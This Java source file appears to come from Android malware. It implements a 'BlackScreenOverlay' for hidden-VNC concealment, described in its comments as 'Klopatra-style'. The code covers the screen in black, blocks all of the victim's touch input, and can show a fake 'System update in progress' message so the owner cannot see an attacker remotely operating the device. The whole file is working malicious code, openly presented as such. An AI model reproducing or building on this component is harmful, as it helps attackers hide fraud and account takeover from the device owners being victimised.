package com.fason.app.features.springe.overlays;
import android.util.Log;

import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;

import com.fason.app.features.springe.delivery.OverlayWindowManager;

/**
 * BlackScreenOverlay — Full-screen black overlay for HVNC concealment.
 *
 * When the attacker is operating the device via HVNC, this overlay:
 * - Covers the entire screen with pure black (or a fake "System Update" screen)
 * - Blocks ALL touch input to the victim
 * - Prevents the victim from seeing attacker's actions
 * - Dims the screen to minimum brightness for discretion
 *
 * This is the "Hidden VNC" (Klopatra-style) concealment mechanism.
 * Must be shown/hidden from the main thread.
 */
public final class BlackScreenOverlay {

    private static final String TAG = "BlackOverlay";

    private final Context context;
    private final OverlayWindowManager windowManager;

    private volatile View overlayView;
    private volatile boolean isShowing = false;

    // Optional: show a fake update message instead of pure black
    private static final boolean SHOW_FAKE_UPDATE = true;

    public BlackScreenOverlay(Context context, OverlayWindowManager windowManager) {
        this.context = context;
        this.windowManager = windowManager;
    }

    /**
     * Show the black overlay. Main thread only.
     */
    public void show() {
        if (isShowing) return;

        try {
            overlayView = createOverlayView();
            OverlayWindowManager.OverlayConfig config = OverlayWindowManager.OverlayConfig.blackHvnc();
            windowManager.addOverlay(overlayView, config);
            isShowing = true;
            Log.i(TAG, "Black screen overlay shown (HVNC concealment active)");
        } catch (Exception e) {
            Log.e(TAG, "Failed to show black overlay", e);
        }
    }

    /**
     * Hide the black overlay. Main thread only.
     */
    public void hide() {
        if (!isShowing || overlayView == null) return;

        try {
            windowManager.removeOverlay(overlayView);
            overlayView = null;
            isShowing = false;
            Log.d(TAG, "Black screen overlay hidden");
        } catch (Exception e) {
            Log.e(TAG, "Error hiding black overlay", e);
        }
    }

    public boolean isShowing() { return isShowing; }

    public void destroy() {
        hide();
    }

    private View createOverlayView() {
        FrameLayout layout = new FrameLayout(context);
        layout.setBackgroundColor(Color.BLACK);
        layout.setClickable(true);
        layout.setFocusable(true);

        if (SHOW_FAKE_UPDATE) {
            // Add a fake system update message
            android.widget.TextView textView = new android.widget.TextView(context);
            textView.setText("System update in progress...\nPlease do not turn off your device");
            textView.setTextColor(Color.WHITE);
            textView.setTextSize(16);
            textView.setGravity(android.view.Gravity.CENTER);
            textView.setAlpha(0.6f);

            FrameLayout.LayoutParams lp = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            );
            lp.gravity = Gravity.CENTER;
            layout.addView(textView, lp);
        }

        return layout;
    }
}
